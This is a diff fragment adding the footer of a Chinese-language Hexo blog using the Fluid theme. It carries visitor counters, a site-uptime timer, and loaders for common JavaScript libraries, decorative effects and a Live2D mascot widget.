+       <a href="https://github.com/Loora1N" target="_blank" rel="nofollow noopener"><span>Loora1N</span></a> <i class="iconfont icon-love"></i> <a href="https://space.bilibili.com/33242548?spm_id_from=333.1007.0.0" target="_blank" rel="nofollow noopener"><span>鷺雨君</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("06/03/2022 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀running🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>   
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/xiantiao.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/love.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":250,"height":500},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
